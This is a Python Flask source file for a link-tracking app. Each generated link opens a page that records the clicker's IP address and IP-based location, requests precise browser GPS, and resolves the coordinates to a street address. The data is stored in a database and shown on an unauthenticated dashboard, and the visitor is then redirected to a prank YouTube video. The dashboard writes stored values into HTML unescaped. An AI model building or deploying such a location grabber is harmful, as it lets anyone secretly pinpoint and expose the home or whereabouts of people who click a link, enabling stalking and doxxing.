from flask import Flask, render_template_string, redirect, url_for, request, jsonify, g
import uuid
import requests
import sqlite3
import os
from datetime import datetime

app = Flask(__name__)

# Production configuration
if os.environ.get('RAILWAY_ENVIRONMENT') or os.environ.get('RENDER') or os.environ.get('PORT'):
    # Production mode
    app.config['DEBUG'] = False
    DATABASE = '/tmp/events.db' if os.environ.get('RENDER') else 'events.db'
else:
    # Development mode
    app.config['DEBUG'] = True
    DATABASE = 'events.db'

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
    return db

def init_db():
    """Initialize the database and create tables if they don't exist"""
    try:
        with app.app_context():
            db = sqlite3.connect(DATABASE)
            
            # Check if table exists and what columns it has
            cursor = db.execute("PRAGMA table_info(events)")
            columns = [column[1] for column in cursor.fetchall()]
            
            if 'events' not in [table[0] for table in db.execute("SELECT name FROM sqlite_master WHERE type='table'").fetchall()]:
                # Create new table with all columns
                db.execute('''CREATE TABLE events (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    ip TEXT,
                    city TEXT,
                    region TEXT,
                    country TEXT,
                    latitude TEXT,
                    longitude TEXT,
                    source TEXT DEFAULT 'unknown',
                    address TEXT,
                    timestamp TEXT
                )''')
                print("Created new events table with all columns")
            else:
                # Add missing columns to existing table
                if 'source' not in columns:
                    db.execute("ALTER TABLE events ADD COLUMN source TEXT DEFAULT 'unknown'")
                    print("Added source column to existing table")
                if 'address' not in columns:
                    db.execute("ALTER TABLE events ADD COLUMN address TEXT")
                    print("Added address column to existing table")
            
            db.commit()
            db.close()
            print(f"Database initialized successfully at {DATABASE}")
    except Exception as e:
        print(f"Error initializing database: {e}")

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

# Initialize database when the module is imported (works with Gunicorn)
init_db()

# In-memory storage for link click counts and last visitor info
link_clicks = {}
last_clicked = {'link_id': None, 'count': 0}
last_visitor = {
    'ip': None,
    'city': None,
    'region': None,
    'country': None,
    'latitude': None,
    'longitude': None
}

# Homepage template
HOME_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Shareable Link Generator</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .link-box { margin: 20px 0; padding: 10px; background: #f0f0f0; border-radius: 6px; }
        .count-box { margin: 20px 0; padding: 10px; background: #e0ffe0; border-radius: 6px; font-size: 1.2em; }
        .geo-box { margin: 20px 0; padding: 10px; background: #e0f7ff; border-radius: 6px; font-size: 1.1em; }
    </style>
</head>
<body>
    <h1>Shareable Link Generator</h1>
    <form method="post" action="/create_link">
        <button type="submit">Create Shareable Link</button>
    </form>
    {% if link_url %}
        <div class="link-box">
            <strong>Your shareable link:</strong> <a href="{{ link_url }}" target="_blank">{{ link_url }}</a>
        </div>
    {% endif %}
    {% if last_clicked_id %}
        <div class="count-box">
            Link <b>{{ last_clicked_id }}</b> has been clicked <b>{{ last_clicked_count }}</b> times.
        </div>
    {% endif %}
    {% if last_visitor_ip %}
        <div class="geo-box">
            <strong>Last Visitor Info:</strong><br>
            IP: {{ last_visitor_ip }}<br>
            Location: {{ last_visitor_city }}, {{ last_visitor_region }}, {{ last_visitor_country }}<br>
            Latitude: {{ last_visitor_latitude }}<br>
            Longitude: {{ last_visitor_longitude }}
        </div>
    {% endif %}
    <br><a href="/events">View All Events (Admin)</a>
</body>
</html>
'''

# Redirecting page template
REDIRECT_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Link Clicked</title>
    <meta http-equiv="refresh" content="10;url={{ youtube_url }}">
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .redirect-box { margin: 40px 0; padding: 20px; background: #fffbe0; border-radius: 6px; font-size: 1.2em; }
    </style>
    <script>
        let locationSaved = false;
        
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendPosition, fallbackToIP);
            } else {
                document.getElementById("location").innerText = "Geolocation not supported. Using IP location...";
                fallbackToIP();
            }
        }
        
        function sendPosition(position) {
            var lat = position.coords.latitude;
            var lon = position.coords.longitude;
            console.log("Browser location obtained:", lat, lon);
            
            fetch('/save_location', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    latitude: lat, 
                    longitude: lon, 
                    source: 'browser' 
                })
            })
            .then(response => response.json())
            .then(data => {
                locationSaved = true;
                document.getElementById("location").innerText =
                    "Precise Location: " + data.latitude + ", " + data.longitude + " (Browser GPS - Saved!)";
                console.log("Location saved successfully:", data);
            })
            .catch((error) => {
                console.error("Error saving location:", error);
                document.getElementById("location").innerText = "Could not save precise location. Using IP location...";
                fallbackToIP();
            });
        }
        
        function fallbackToIP() {
            if (locationSaved) return; // Don't fallback if we already saved precise location
            
            console.log("Using IP-based geolocation fallback");
            fetch('/save_ip_location', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ source: 'ip' })
            })
            .then(response => response.json())
            .then(data => {
                locationSaved = true;
                if (data.latitude && data.longitude) {
                    document.getElementById("location").innerText =
                        "IP Location: " + data.latitude + ", " + data.longitude + " (" + data.city + ", " + data.country + " - Saved!)";
                } else {
                    document.getElementById("location").innerText = "Location saved using IP address.";
                }
                console.log("IP location saved:", data);
            })
            .catch((error) => {
                console.error("Error saving IP location:", error);
                document.getElementById("location").innerText = "Location services unavailable.";
            });
        }
        
        function showError(error) {
            console.log("Geolocation error:", error.message);
            let errorMsg = "";
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    errorMsg = "Location access denied. Using IP location...";
                    break;
                case error.POSITION_UNAVAILABLE:
                    errorMsg = "Location unavailable. Using IP location...";
                    break;
                case error.TIMEOUT:
                    errorMsg = "Location timeout. Using IP location...";
                    break;
                default:
                    errorMsg = "Location error. Using IP location...";
                    break;
            }
            document.getElementById("location").innerText = errorMsg;
            fallbackToIP();
        }
        
        window.onload = getLocation;
    </script>
</head>
<body>
    <div class="redirect-box">
        <h2>Link clicked!</h2>
        <p>This link has been clicked <b>{{ count }}</b> times.</p>
        <p id="location">Retrieving your location...</p>
        <p>Redirecting you to <a href="{{ youtube_url }}" target="_blank">YouTube</a> in a few seconds...</p>
    </div>
    <a href="/">Back to Home</a>
</body>
</html>
'''

@app.route('/', methods=['GET'])
def home():
    link_url = None
    last_clicked_id = last_clicked['link_id']
    last_clicked_count = last_clicked['count']
    return render_template_string(
        HOME_TEMPLATE,
        link_url=link_url,
        last_clicked_id=last_clicked_id,
        last_clicked_count=last_clicked_count,
        last_visitor_ip=last_visitor['ip'],
        last_visitor_city=last_visitor['city'],
        last_visitor_region=last_visitor['region'],
        last_visitor_country=last_visitor['country'],
        last_visitor_latitude=last_visitor['latitude'],
        last_visitor_longitude=last_visitor['longitude']
    )

@app.route('/create_link', methods=['POST'])
def create_link():
    link_id = str(uuid.uuid4())
    link_clicks[link_id] = 0
    link_url = url_for('link_clicked', link_id=link_id, _external=True)
    return render_template_string(
        HOME_TEMPLATE,
        link_url=link_url,
        last_clicked_id=last_clicked['link_id'],
        last_clicked_count=last_clicked['count'],
        last_visitor_ip=last_visitor['ip'],
        last_visitor_city=last_visitor['city'],
        last_visitor_region=last_visitor['region'],
        last_visitor_country=last_visitor['country'],
        last_visitor_latitude=last_visitor['latitude'],
        last_visitor_longitude=last_visitor['longitude']
    )

@app.route('/link/<link_id>')
def link_clicked(link_id):
    if link_id in link_clicks:
        link_clicks[link_id] += 1
        count = link_clicks[link_id]
        last_clicked['link_id'] = link_id
        last_clicked['count'] = count
    else:
        count = 0
    
    # Get user IP
    if request.headers.get('X-Forwarded-For'):
        ip = request.headers.get('X-Forwarded-For').split(',')[0]
    else:
        ip = request.remote_addr
    
    print(f"[Link Clicked] Link ID: {link_id}, Count: {count}, IP: {ip}")
    
    # Get geolocation info using improved function
    geo_data = get_ip_geolocation(ip)
    city = geo_data.get('city', 'Unknown')
    region = geo_data.get('region_name', 'Unknown')
    country = geo_data.get('country_name', 'Unknown')
    ip_lat = geo_data.get('latitude', 'Unknown')
    ip_lng = geo_data.get('longitude', 'Unknown')
    
    print(f"[IP Geolocation] City: {city}, Region: {region}, Country: {country}, Lat: {ip_lat}, Lng: {ip_lng}")
    
    last_visitor['ip'] = ip
    last_visitor['city'] = city
    last_visitor['region'] = region
    last_visitor['country'] = country
    last_visitor['ip_latitude'] = ip_lat
    last_visitor['ip_longitude'] = ip_lng
    # Browser lat/lon will be set by /save_location if available
    
    youtube_url = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'
    return render_template_string(REDIRECT_TEMPLATE, count=count, youtube_url=youtube_url)

@app.route('/save_location', methods=['POST'])
def save_location():
    data = request.get_json()
    lat = data.get('latitude')
    lon = data.get('longitude')
    source = data.get('source', 'browser')
    
    print(f"[Location Received] Source: {source}, Latitude: {lat}, Longitude: {lon}")
    
    # Get address from coordinates
    address = get_address_from_coords(lat, lon)
    print(f"[Address Resolution] {address}")
    
    last_visitor['latitude'] = lat
    last_visitor['longitude'] = lon
    last_visitor['address'] = address
    
    # Save to DB
    ip = last_visitor.get('ip', 'Unknown')
    city = last_visitor.get('city', 'Unknown')
    region = last_visitor.get('region', 'Unknown')
    country = last_visitor.get('country', 'Unknown')
    timestamp = datetime.utcnow().isoformat()
    
    try:
        db = get_db()
        db.execute('INSERT INTO events (ip, city, region, country, latitude, longitude, source, address, timestamp) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
                   (ip, city, region, country, str(lat), str(lon), source, address, timestamp))
        db.commit()
        print(f"[Database] Saved - IP: {ip}, City: {city}, Lat: {lat}, Lng: {lon}, Address: {address[:50]}..., Source: {source}")
    except Exception as e:
        print(f"[Database Error] Failed to save location: {e}")
    
    return jsonify({
        'latitude': lat, 
        'longitude': lon, 
        'source': source,
        'city': city,
        'country': country,
        'address': address
    })

@app.route('/save_ip_location', methods=['POST'])
def save_ip_location():
    """Fallback endpoint that uses IP-based geolocation when browser location is denied"""
    data = request.get_json()
    source = 'ip_fallback'
    
    # Use the IP-based coordinates we already fetched
    ip_lat = last_visitor.get('ip_latitude', 'Unknown')
    ip_lng = last_visitor.get('ip_longitude', 'Unknown')
    
    print(f"[IP Location Fallback] Using IP-based coordinates: Lat: {ip_lat}, Lng: {ip_lng}")
    
    # Get address from IP coordinates
    address = "Address from IP location"
    if ip_lat != 'Unknown' and ip_lng != 'Unknown':
        address = get_address_from_coords(ip_lat, ip_lng)
    
    # Set these as the main coordinates since browser location failed
    last_visitor['latitude'] = ip_lat
    last_visitor['longitude'] = ip_lng
    last_visitor['address'] = address
    
    # Save to DB
    ip = last_visitor.get('ip', 'Unknown')
    city = last_visitor.get('city', 'Unknown')
    region = last_visitor.get('region', 'Unknown')
    country = last_visitor.get('country', 'Unknown')
    timestamp = datetime.utcnow().isoformat()
    
    try:
        db = get_db()
        db.execute('INSERT INTO events (ip, city, region, country, latitude, longitude, source, address, timestamp) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
                   (ip, city, region, country, str(ip_lat), str(ip_lng), source, address, timestamp))
        db.commit()
        print(f"[Database] IP Fallback Saved - IP: {ip}, City: {city}, Lat: {ip_lat}, Lng: {ip_lng}, Address: {address[:50]}..., Source: {source}")
    except Exception as e:
        print(f"[Database Error] Failed to save IP location: {e}")
    
    return jsonify({
        'latitude': ip_lat, 
        'longitude': ip_lng, 
        'source': source,
        'city': city,
        'country': country,
        'address': address
    })

@app.route('/events')
def events():
    try:
        db = get_db()
        
        # Get total count first
        count_cur = db.execute('SELECT COUNT(*) FROM events')
        total_events = count_cur.fetchone()[0]
        
        # Check what columns exist
        cursor = db.execute("PRAGMA table_info(events)")
        columns = [column[1] for column in cursor.fetchall()]
        
        # Build query based on available columns
        if 'address' in columns and 'source' in columns:
            query = 'SELECT ip, city, region, country, latitude, longitude, source, address, timestamp FROM events ORDER BY id DESC'
        elif 'source' in columns:
            query = 'SELECT ip, city, region, country, latitude, longitude, source, timestamp FROM events ORDER BY id DESC'
        else:
            query = 'SELECT ip, city, region, country, latitude, longitude, timestamp FROM events ORDER BY id DESC'
        
        cur = db.execute(query)
        rows = cur.fetchall()
        
        print(f"[Events Page] Displaying {len(rows)} events from database")
        
        events_html = f'''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Location Events</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; }}
                table {{ border-collapse: collapse; width: 100%; }}
                th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
                th {{ background-color: #f2f2f2; }}
                tr:nth-child(even) {{ background-color: #f9f9f9; }}
                .refresh-btn {{ background-color: #4CAF50; color: white; padding: 10px 20px; text-decoration: none; border-radius: 4px; margin: 10px 0; display: inline-block; }}
                .back-btn {{ background-color: #008CBA; color: white; padding: 10px 20px; text-decoration: none; border-radius: 4px; margin: 10px 10px; display: inline-block; }}
                .stats {{ background-color: #e7f3ff; padding: 10px; border-radius: 5px; margin: 10px 0; }}
                .address {{ max-width: 200px; word-wrap: break-word; }}
            </style>
            <script>
                function refreshPage() {{
                    location.reload();
                }}
                setInterval(refreshPage, 30000); // Auto-refresh every 30 seconds
            </script>
        </head>
        <body>
            <h1>Location Events Dashboard</h1>
            <div class="stats">
                <strong>Total Events:</strong> {total_events} | 
                <strong>Last Updated:</strong> {datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")} UTC |
                <span style="color: green;">● Auto-refreshing every 30 seconds</span>
            </div>
            
            <a href="/events" class="refresh-btn">🔄 Refresh Now</a>
            <a href="/" class="back-btn">🏠 Back to Home</a>
            
            <table>
                <tr>
                    <th>IP Address</th>
                    <th>City</th>
                    <th>Region</th>
                    <th>Country</th>
                    <th>Latitude</th>
                    <th>Longitude</th>
        '''
        
        if 'source' in columns:
            events_html += '<th>Location Source</th>'
        if 'address' in columns:
            events_html += '<th>Address</th>'
        
        events_html += '<th>Timestamp (UTC)</th></tr>'
        
        if rows:
            for row in rows:
                if len(row) >= 8 and 'address' in columns and 'source' in columns:
                    ip, city, region, country, lat, lng, source, address, timestamp = row
                elif len(row) >= 7 and 'source' in columns:
                    ip, city, region, country, lat, lng, source, timestamp = row
                    address = 'N/A'
                else:
                    ip, city, region, country, lat, lng, timestamp = row
                    source = 'unknown'
                    address = 'N/A'
                
                source_display = {
                    'browser': '📱 Browser GPS',
                    'ip_fallback': '🌐 IP Geolocation',
                    'unknown': '❓ Unknown'
                }.get(source, source)
                
                events_html += f'''
                <tr>
                    <td>{ip}</td>
                    <td>{city}</td>
                    <td>{region}</td>
                    <td>{country}</td>
                    <td>{lat}</td>
                    <td>{lng}</td>
                '''
                
                if 'source' in columns:
                    events_html += f'<td>{source_display}</td>'
                if 'address' in columns:
                    events_html += f'<td class="address">{address}</td>'
                
                events_html += f'<td>{timestamp}</td></tr>'
        else:
            colspan = 7 + ('source' in columns) + ('address' in columns)
            events_html += f'''
            <tr>
                <td colspan="{colspan}" style="text-align: center; padding: 20px; color: #666;">
                    No location events recorded yet. Click a shareable link to generate data!
                </td>
            </tr>
            '''
        
        events_html += '''
            </table>
            
            <br>
            <div style="margin-top: 20px; padding: 10px; background-color: #f0f0f0; border-radius: 5px;">
                <h3>How it works:</h3>
                <ul>
                    <li><strong>📱 Browser GPS:</strong> Precise location from user's device (requires permission)</li>
                    <li><strong>🌐 IP Geolocation:</strong> Approximate location based on IP address (fallback)</li>
                </ul>
            </div>
        </body>
        </html>
        '''
        
        return events_html
        
    except Exception as e:
        error_msg = f"<h2>Error accessing database</h2><p>{e}</p><br><a href='/'>Back to Home</a>"
        print(f"[Events Page Error] {e}")
        return error_msg

def get_ip_geolocation(ip):
    """Get geolocation from IP using multiple APIs for better reliability"""
    
    # Handle localhost/private IPs
    if ip in ['127.0.0.1', 'localhost'] or ip.startswith('192.168.') or ip.startswith('10.') or ip.startswith('172.'):
        print(f"[IP Geolocation] Localhost/Private IP detected: {ip}, using demo location")
        return {
            'city': 'Demo City',
            'region_name': 'Demo Region', 
            'country_name': 'Demo Country',
            'latitude': '40.7128',
            'longitude': '-74.0060'
        }
    
    apis = [
        # Primary API
        {
            'url': f'https://reallyfreegeoip.org/json/{ip}',
            'city_key': 'city',
            'region_key': 'region_name',
            'country_key': 'country_name',
            'lat_key': 'latitude',
            'lng_key': 'longitude'
        },
        # Backup API 1
        {
            'url': f'http://ip-api.com/json/{ip}',
            'city_key': 'city',
            'region_key': 'regionName',
            'country_key': 'country',
            'lat_key': 'lat',
            'lng_key': 'lon'
        },
        # Backup API 2  
        {
            'url': f'https://ipapi.co/{ip}/json/',
            'city_key': 'city',
            'region_key': 'region',
            'country_key': 'country_name',
            'lat_key': 'latitude',
            'lng_key': 'longitude'
        }
    ]
    
    for i, api in enumerate(apis):
        try:
            print(f"[IP Geolocation] Trying API {i+1}: {api['url']}")
            response = requests.get(api['url'], timeout=5)
            data = response.json()
            
            city = data.get(api['city_key'], 'Unknown')
            region = data.get(api['region_key'], 'Unknown')
            country = data.get(api['country_key'], 'Unknown')
            lat = data.get(api['lat_key'], 'Unknown')
            lng = data.get(api['lng_key'], 'Unknown')
            
            # Check if we got valid data
            if city and city != 'Unknown' and lat and lat != 'Unknown':
                print(f"[IP Geolocation] Success with API {i+1}: {city}, {region}, {country}")
                return {
                    'city': city,
                    'region_name': region,
                    'country_name': country,
                    'latitude': str(lat),
                    'longitude': str(lng)
                }
                
        except Exception as e:
            print(f"[IP Geolocation] API {i+1} failed: {e}")
            continue
    
    # All APIs failed
    print("[IP Geolocation] All APIs failed, using fallback")
    return {
        'city': 'Unknown',
        'region_name': 'Unknown',
        'country_name': 'Unknown',
        'latitude': 'Unknown',
        'longitude': 'Unknown'
    }

def get_address_from_coords(lat, lng):
    """Get address from coordinates using reverse geocoding"""
    try:
        # Using OpenStreetMap Nominatim (free)
        url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lng}&zoom=18&addressdetails=1"
        headers = {'User-Agent': 'ShareableLinkTracker/1.0'}
        response = requests.get(url, headers=headers, timeout=5)
        data = response.json()
        
        if 'display_name' in data:
            return data['display_name']
        else:
            return "Address not found"
            
    except Exception as e:
        print(f"[Reverse Geocoding] Error: {e}")
        return "Address unavailable"

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=app.config['DEBUG']) 